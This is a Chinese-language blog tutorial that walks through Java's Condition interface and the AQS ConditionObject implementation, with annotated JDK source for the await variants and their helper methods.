    <url>/2020/03/20/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-20-Lock%E5%92%8CCondition%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Condition对象"><a href="#Condition对象" class="headerlink" title="Condition对象"></a>Condition对象</h1><p>Java提供了Condition对象来实现等待/通知。</p>
<p>Object对象提供了wait、waitAll、notify、notifyAll的方法用来实现线程的同步、等待和唤醒。Condition类提供了比wait/notify更丰富的功能，Condition对象由lock对象所创建的，同时一个Lock可以创建多个Condition对象，即创建多个对象监听器，这样就可以指定唤醒具体线程，而notify是随机唤醒线程。</p>
<h2 id="Condition接口包含的方法"><a href="#Condition接口包含的方法" class="headerlink" title="Condition接口包含的方法"></a>Condition接口包含的方法</h2><p>先看下Condition的源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Condition</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">await</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">awaitUninterruptibly</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">awaitNanos</span><span class="params">(<span class="keyword">long</span> nanosTimeout)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">await</span><span class="params">(<span class="keyword">long</span> time, TimeUnit unit)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">awaitUntil</span><span class="params">(Date deadline)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">signal</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">signalAll</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Condition主要提供了以下方法：</p>
<ul>
<li>await：使当前线程在接到信号或者中断之前一直阻塞等待；</li>
<li>awaitUninterruptibly：使当前线程在收到信号之前一直等待。此处对中断不做响应</li>
<li>awaitNanos：使当前线程在接到信号或者中断或者到达指定的纳秒时间之前一直阻塞等待</li>
<li>await(long time, TimeUnit unit)：使当前线程在接到信号或者中断或者到达指定的时间之前一直阻塞等待。此处可指定任意时间以及单位</li>
<li>awaitUntil(Date deadline)：使当前线程在接到信号或者中断或者到达截止日期之前一直阻塞等待</li>
<li>signal：唤醒一个等待线程</li>
<li>signalAll：唤醒所有的等待线程</li>
</ul>
<p>AQS中的ConditionObject是实现Condition接口的实现。ConditionObject的等待队列是一个FIFO队列，队列的每个节点都是等待在Condition对象上的线程的引用，在调用Condition的await()方法之后，线程释放锁，构造成相应的节点进入等待队列等待。其中节点的定义复用AQS的Node定义。</p>
<h2 id="ConditionObject"><a href="#ConditionObject" class="headerlink" title="ConditionObject"></a>ConditionObject</h2><p>先看看这个对象的字段定义</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConditionObject</span> <span class="keyword">implements</span> <span class="title">Condition</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1173984872572414699L</span>;</span><br><span class="line">        <span class="comment">/** First node of condition queue. */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">transient</span> Node firstWaiter;</span><br><span class="line">        <span class="comment">/** Last node of condition queue. */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">transient</span> Node lastWaiter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ConditionObject是AQS的内部类，这样它就能访问到AQS的FIFO队列了。COnditionObject内部维护的是一个单向队列，它的首节点就是一个第一个被阻塞的线程节点。</p>
<p>下面我们挨个看下它的一些方法是怎么实现的。</p>
<h3 id="await方法"><a href="#await方法" class="headerlink" title="await方法"></a>await方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Implements interruptible condition wait.</span></span><br><span class="line"><span class="comment">         * 实现了可中断的条件等待</span></span><br><span class="line"><span class="comment">         * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; If current thread is interrupted, throw InterruptedException.</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; Save lock state returned by &#123;<span class="doctag">@link</span> #getState&#125;.</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; Invoke &#123;<span class="doctag">@link</span> #release&#125; with saved state as argument,</span></span><br><span class="line"><span class="comment">         *      throwing IllegalMonitorStateException if it fails.</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; Block until signalled or interrupted.</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; Reacquire by invoking specialized version of</span></span><br><span class="line"><span class="comment">         *      &#123;<span class="doctag">@link</span> #acquire&#125; with saved state as argument.</span></span><br><span class="line"><span class="comment">         * &lt;li&gt; If interrupted while blocked in step 4, throw InterruptedException.</span></span><br><span class="line"><span class="comment">         * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">await</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">                <span class="comment">// 如果当前线程已经被中断了，则直接抛出InterruptedException</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InterruptedException();</span><br><span class="line">            <span class="comment">// 构造线程节点，添加到队尾</span></span><br><span class="line">            Node node = addConditionWaiter();</span><br><span class="line">            <span class="comment">// 添加进队列之后，释放锁，</span></span><br><span class="line">            <span class="keyword">int</span> savedState = fullyRelease(node);</span><br><span class="line">            <span class="keyword">int</span> interruptMode = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 死循环判断当前被唤醒的节点是否已经转移到AQS同步队列中，成功就退出循环</span></span><br><span class="line">            <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">                LockSupport.park(<span class="keyword">this</span>);</span><br><span class="line">                <span class="comment">// 如果发生中断则确保节点加入同步队列并跳出循环</span></span><br><span class="line">                <span class="keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 被通知或者被中断的线程，继续获取竞争锁</span></span><br><span class="line">            <span class="comment">// 获取成功或者被取消则再设置中断模式</span></span><br><span class="line">            <span class="keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)</span><br><span class="line">                interruptMode = REINTERRUPT;</span><br><span class="line">            <span class="comment">// 删除取消的后继等待节点</span></span><br><span class="line">            <span class="keyword">if</span> (node.nextWaiter != <span class="keyword">null</span>) <span class="comment">// clean up if cancelled</span></span><br><span class="line">                unlinkCancelledWaiters();</span><br><span class="line">            <span class="comment">// 根据中断模式抛出异常</span></span><br><span class="line">            <span class="keyword">if</span> (interruptMode != <span class="number">0</span>)</span><br><span class="line">                reportInterruptAfterWait(interruptMode);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="addConditionWaiter方法"><a href="#addConditionWaiter方法" class="headerlink" title="addConditionWaiter方法"></a>addConditionWaiter方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将当前的线程作为waiter添加到等待队列</span></span><br><span class="line"><span class="comment"> * 返回当前节点的引用</span></span><br><span class="line"><span class="comment">       * Adds a new waiter to wait queue.</span></span><br><span class="line"><span class="comment">       * <span class="doctag">@return</span> its new wait node</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">private</span> Node <span class="title">addConditionWaiter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          Node t = lastWaiter;</span><br><span class="line">          <span class="comment">// If lastWaiter is cancelled, clean out.</span></span><br><span class="line">          <span class="keyword">if</span> (t != <span class="keyword">null</span> &amp;&amp; t.waitStatus != Node.CONDITION) &#123;</span><br><span class="line">              <span class="comment">// 如果t的状态时cancelled，从队列中清除</span></span><br><span class="line">              unlinkCancelledWaiters();</span><br><span class="line">              t = lastWaiter;</span><br><span class="line">          &#125;</span><br><span class="line">          Node node = <span class="keyword">new</span> Node(Thread.currentThread(), Node.CONDITION);</span><br><span class="line">          <span class="keyword">if</span> (t == <span class="keyword">null</span>)</span><br><span class="line">              <span class="comment">// 首节点和尾节点都指向当前节点</span></span><br><span class="line">              firstWaiter = node;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">              <span class="comment">// 链接到队尾</span></span><br><span class="line">              t.nextWaiter = node;</span><br><span class="line">          lastWaiter = node;</span><br><span class="line">          <span class="keyword">return</span> node;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="unlinkCancelledWaiters方法"><a href="#unlinkCancelledWaiters方法" class="headerlink" title="unlinkCancelledWaiters方法"></a>unlinkCancelledWaiters方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将链表中的cancelled节点从链表中移除。其中变量trail保存的是当前节点的前置节点的引用</span></span><br><span class="line"><span class="comment"> * t保存的是当前节点的下一个节点的引用。</span></span><br><span class="line"><span class="comment"> * 分两种情况，如果头结点是cancelled状态</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *  |cancelled | nextWaiter | ---&gt;       | condition | nextWaiter | ---&gt; null</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *  移除后</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *  |cancelled | nextWaiter | ---&gt; null  | condition | nextWaiter | ---&gt; null</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *                                                   ^</span></span><br><span class="line"><span class="comment"> *                                                   |</span></span><br><span class="line"><span class="comment"> *                                                 firstWaiter</span></span><br><span class="line"><span class="comment"> * 如果头结点不是cancelled状态</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *  |condition | nextWaiter | ---&gt;       | cancelled | nextWaiter | ---&gt; null</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> * 移除后</span></span><br><span class="line"><span class="comment"> * *  -------------------------          -------------------------</span></span><br><span class="line"><span class="comment"> *  |cancelled | nextWaiter | ---&gt; null  | condition | nextWaiter | ---&gt; null</span></span><br><span class="line"><span class="comment"> *  -------------------------            -------------------------</span></span><br><span class="line"><span class="comment"> *             ^</span></span><br><span class="line"><span class="comment"> *             |</span></span><br><span class="line"><span class="comment">       *          firstWaiter</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment">       * Unlinks cancelled waiter nodes from condition queue.</span></span><br><span class="line"><span class="comment">       * Called only while holding lock. This is called when</span></span><br><span class="line"><span class="comment">       * cancellation occurred during condition wait, and upon</span></span><br><span class="line"><span class="comment">       * insertion of a new waiter when lastWaiter is seen to have</span></span><br><span class="line"><span class="comment">       * been cancelled. This method is needed to avoid garbage</span></span><br><span class="line"><span class="comment">       * retention in the absence of signals. So even though it may</span></span><br><span class="line"><span class="comment">       * require a full traversal, it comes into play only when</span></span><br><span class="line"><span class="comment">       * timeouts or cancellations occur in the absence of</span></span><br><span class="line"><span class="comment">       * signals. It traverses all nodes rather than stopping at a</span></span><br><span class="line"><span class="comment">       * particular target to unlink all pointers to garbage nodes</span></span><br><span class="line"><span class="comment">       * without requiring many re-traversals during cancellation</span></span><br><span class="line"><span class="comment">       * storms.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">unlinkCancelledWaiters</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          Node t = firstWaiter;</span><br><span class="line">          Node trail = <span class="keyword">null</span>;</span><br><span class="line">          <span class="keyword">while</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">              Node next = t.nextWaiter;</span><br><span class="line">              <span class="keyword">if</span> (t.waitStatus != Node.CONDITION) &#123;</span><br><span class="line">                  t.nextWaiter = <span class="keyword">null</span>;</span><br><span class="line">                  <span class="keyword">if</span> (trail == <span class="keyword">null</span>)</span><br><span class="line">                      firstWaiter = next;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                      trail.nextWaiter = next;</span><br><span class="line">                  <span class="keyword">if</span> (next == <span class="keyword">null</span>)</span><br><span class="line">                      lastWaiter = trail;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                  trail = t;</span><br><span class="line">              t = next;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="fullyRelease方法"><a href="#fullyRelease方法" class="headerlink" title="fullyRelease方法"></a>fullyRelease方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 释放锁并返回新的state，如果释放失败，则把当前的节点状态改为cancelled</span></span><br><span class="line"><span class="comment"> * 注意，设置cancelled状态是在finally里面的。只要释放失败，就改节点状态</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * Invokes release with current state value; returns saved state.</span></span><br><span class="line"><span class="comment">    * Cancels node and throws exception on failure.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> node the condition node for this wait</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> previous sync state</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">fullyRelease</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">boolean</span> failed = <span class="keyword">true</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">int</span> savedState = getState();</span><br><span class="line">           <span class="keyword">if</span> (release(savedState)) &#123;</span><br><span class="line">               failed = <span class="keyword">false</span>;</span><br><span class="line">               <span class="keyword">return</span> savedState;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalMonitorStateException();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (failed)</span><br><span class="line">               node.waitStatus = Node.CANCELLED;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h4 id="isOnSyncQueue"><a href="#isOnSyncQueue" class="headerlink" title="isOnSyncQueue"></a>isOnSyncQueue</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Returns true if a node, always one that was initially placed on</span></span><br><span class="line"><span class="comment">    * a condition queue, is now waiting to reacquire on sync queue.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> true if is reacquiring</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isOnSyncQueue</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 转移到AQS同步队列的节点状态为都会设置为初始状态（值为0）</span></span><br><span class="line">       <span class="keyword">if</span> (node.waitStatus == Node.CONDITION || node.prev == <span class="keyword">null</span>)</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       <span class="comment">// 当节点是AQS同步队列的中间节点时（在同步队列中含有next节点）则返回true</span></span><br><span class="line">       <span class="keyword">if</span> (node.next != <span class="keyword">null</span>) <span class="comment">// If has successor, it must be on queue</span></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * node.prev can be non-null, but not yet on queue because</span></span><br><span class="line"><span class="comment">        * the CAS to place it on queue can fail. So we have to</span></span><br><span class="line"><span class="comment">        * traverse from tail to make sure it actually made it.  It</span></span><br><span class="line"><span class="comment">        * will always be near the tail in calls to this method, and</span></span><br><span class="line"><span class="comment">        * unless the CAS failed (which is unlikely), it will be</span></span><br><span class="line"><span class="comment">        * there, so we hardly ever traverse much.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">return</span> findNodeFromTail(node);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><ol>
<li><p>将当前线程封装为Node节点并加入到条件等待队列中；</p>
</li>
<li><p>释放锁，如果释放锁成功，则调用unparkSuccessor方法唤醒该节点在AQS的FIFO队列中的后继节点；</p>
</li>
<li><p>while死循环判断是否已经在AQS的FIFO队列中了（其他线程调用signal或者signalAll方法时，会触发这个节点被转移到FIFO队列的动作）；</p>
<ul>
<li>如果没有在FIFO队列中，则park当前线程，等待唤醒；</li>
<li>同时通过方法checkInterruptWhileWaiting判断线程是否在等待的过程中发生了中断，赋值interruptMode中断便签</li>
</ul>
</li>
<li><p>关于中断模式： 1) 当在被通知前被中断则将中断模式设置为THROW_IE； 2) 当在被通知后则将中断模式设置为REINTERRUPT(因为acquireQueued不会响应中断)。</p>
</li>
<li><p>删除取消的后继等待节点。</p>
</li>
<li><p>根据中断模式抛出异常。</p>
</li>
</ol>
<h3 id="awaitUninterruptibly方法"><a href="#awaitUninterruptibly方法" class="headerlink" title="awaitUninterruptibly方法"></a>awaitUninterruptibly方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果在死循环的过程中，线程被中断了，忽略</span></span><br><span class="line"><span class="comment">       * Implements uninterruptible condition wait.</span></span><br><span class="line"><span class="comment">       * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Save lock state returned by &#123;<span class="doctag">@link</span> #getState&#125;.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Invoke &#123;<span class="doctag">@link</span> #release&#125; with saved state as argument,</span></span><br><span class="line"><span class="comment">       *      throwing IllegalMonitorStateException if it fails.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Block until signalled.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Reacquire by invoking specialized version of</span></span><br><span class="line"><span class="comment">       *      &#123;<span class="doctag">@link</span> #acquire&#125; with saved state as argument.</span></span><br><span class="line"><span class="comment">       * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">awaitUninterruptibly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          Node node = addConditionWaiter();</span><br><span class="line">          <span class="keyword">int</span> savedState = fullyRelease(node);</span><br><span class="line">          <span class="keyword">boolean</span> interrupted = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">              LockSupport.park(<span class="keyword">this</span>);</span><br><span class="line">              <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">                  interrupted = <span class="keyword">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (acquireQueued(node, savedState) || interrupted)</span><br><span class="line">              selfInterrupt();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>



<h3 id="awaitNanos方法"><a href="#awaitNanos方法" class="headerlink" title="awaitNanos方法"></a>awaitNanos方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 和await方法类似，增加了超时时间</span></span><br><span class="line"><span class="comment"> * 超时了之后，直接将当前节点转入AQS的FIFO队列</span></span><br><span class="line"><span class="comment">       * Implements timed condition wait.</span></span><br><span class="line"><span class="comment">       * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If current thread is interrupted, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Save lock state returned by &#123;<span class="doctag">@link</span> #getState&#125;.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Invoke &#123;<span class="doctag">@link</span> #release&#125; with saved state as argument,</span></span><br><span class="line"><span class="comment">       *      throwing IllegalMonitorStateException if it fails.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Block until signalled, interrupted, or timed out.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Reacquire by invoking specialized version of</span></span><br><span class="line"><span class="comment">       *      &#123;<span class="doctag">@link</span> #acquire&#125; with saved state as argument.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If interrupted while blocked in step 4, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> <span class="title">awaitNanos</span><span class="params">(<span class="keyword">long</span> nanosTimeout)</span></span></span><br><span class="line"><span class="function">              <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> InterruptedException();</span><br><span class="line">          Node node = addConditionWaiter();</span><br><span class="line">          <span class="keyword">int</span> savedState = fullyRelease(node);</span><br><span class="line">          <span class="keyword">final</span> <span class="keyword">long</span> deadline = System.nanoTime() + nanosTimeout;</span><br><span class="line">          <span class="keyword">int</span> interruptMode = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">              <span class="keyword">if</span> (nanosTimeout &lt;= <span class="number">0L</span>) &#123;</span><br><span class="line">                  transferAfterCancelledWait(node);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (nanosTimeout &gt;= spinForTimeoutThreshold)</span><br><span class="line">                  LockSupport.parkNanos(<span class="keyword">this</span>, nanosTimeout);</span><br><span class="line">              <span class="keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              nanosTimeout = deadline - System.nanoTime();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)</span><br><span class="line">              interruptMode = REINTERRUPT;</span><br><span class="line">          <span class="keyword">if</span> (node.nextWaiter != <span class="keyword">null</span>)</span><br><span class="line">              unlinkCancelledWaiters();</span><br><span class="line">          <span class="keyword">if</span> (interruptMode != <span class="number">0</span>)</span><br><span class="line">              reportInterruptAfterWait(interruptMode);</span><br><span class="line">          <span class="keyword">return</span> deadline - System.nanoTime();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="transferAfterCancelledWait方法"><a href="#transferAfterCancelledWait方法" class="headerlink" title="transferAfterCancelledWait方法"></a>transferAfterCancelledWait方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Transfers node, if necessary, to sync queue after a cancelled wait.</span></span><br><span class="line"><span class="comment">    * Returns true if thread was cancelled before being signalled.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> true if cancelled before the node was signalled</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">transferAfterCancelledWait</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (compareAndSetWaitStatus(node, Node.CONDITION, <span class="number">0</span>)) &#123;</span><br><span class="line">           enq(node);</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * If we lost out to a signal(), then we can't proceed</span></span><br><span class="line"><span class="comment">        * until it finishes its enq().  Cancelling during an</span></span><br><span class="line"><span class="comment">        * incomplete transfer is both rare and transient, so just</span></span><br><span class="line"><span class="comment">        * spin.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">while</span> (!isOnSyncQueue(node))</span><br><span class="line">           Thread.yield();</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="awaitUntil方法"><a href="#awaitUntil方法" class="headerlink" title="awaitUntil方法"></a>awaitUntil方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在截止时间之前如果没有被唤醒的话则强制将当前的Node加入到AQS的FIFO队列</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment">       * Implements absolute timed condition wait.</span></span><br><span class="line"><span class="comment">       * &lt;ol&gt;</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If current thread is interrupted, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Save lock state returned by &#123;<span class="doctag">@link</span> #getState&#125;.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Invoke &#123;<span class="doctag">@link</span> #release&#125; with saved state as argument,</span></span><br><span class="line"><span class="comment">       *      throwing IllegalMonitorStateException if it fails.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Block until signalled, interrupted, or timed out.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; Reacquire by invoking specialized version of</span></span><br><span class="line"><span class="comment">       *      &#123;<span class="doctag">@link</span> #acquire&#125; with saved state as argument.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If interrupted while blocked in step 4, throw InterruptedException.</span></span><br><span class="line"><span class="comment">       * &lt;li&gt; If timed out while blocked in step 4, return false, else true.</span></span><br><span class="line"><span class="comment">       * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">awaitUntil</span><span class="params">(Date deadline)</span></span></span><br><span class="line"><span class="function">              <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">          <span class="keyword">long</span> abstime = deadline.getTime();</span><br><span class="line">          <span class="keyword">if</span> (Thread.interrupted())</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> InterruptedException();</span><br><span class="line">          Node node = addConditionWaiter();</span><br><span class="line">          <span class="keyword">int</span> savedState = fullyRelease(node);</span><br><span class="line">          <span class="keyword">boolean</span> timedout = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">int</span> interruptMode = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> (!isOnSyncQueue(node)) &#123;</span><br><span class="line">              <span class="keyword">if</span> (System.currentTimeMillis() &gt; abstime) &#123;</span><br><span class="line">                  timedout = transferAfterCancelledWait(node);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              LockSupport.parkUntil(<span class="keyword">this</span>, abstime);</span><br><span class="line">              <span class="keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)</span><br><span class="line">              interruptMode = REINTERRUPT;</span><br><span class="line">          <span class="keyword">if</span> (node.nextWaiter != <span class="keyword">null</span>)</span><br><span class="line">              unlinkCancelledWaiters();</span><br><span class="line">          <span class="keyword">if</span> (interruptMode != <span class="number">0</span>)</span><br><span class="line">              reportInterruptAfterWait(interruptMode);</span><br><span class="line">          <span class="keyword">return</span> !timedout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

